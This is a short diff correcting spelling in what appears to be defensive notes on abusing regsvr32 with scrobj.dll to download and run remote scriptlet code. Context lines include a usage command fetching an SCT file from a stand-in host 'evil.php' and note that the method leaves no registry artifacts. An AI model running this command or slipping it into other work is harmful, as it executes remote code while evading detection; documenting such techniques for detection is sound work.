@@ -5,9 +5,9 @@ to download and execute files
 Usage:
 regSvr32 /s /n /u /i:http[:]//evil.php/evil.sct scrobj.dll
 
-regsvr32 is invoking scrobj.dll to unregister COM objescts defined in the evil.sct. Malicious code will be used in the sct file.
+regsvr32 is invoking scrobj.dll to unregister COM objects defined in the evil.sct. Malicious code will be used in the sct file.
 The SCT file ( an XML file) has a registration tag in it that can contain VBScript or JScript code.  The file can have any extension.
-It doesn’t have to be .sct. There wiil be no artifacts left in registry if this utility is unregistering any COM object.
+It doesn’t have to be .sct. There will be no artifacts left in registry if this utility is unregistering any COM object.
 
 
 Detection:
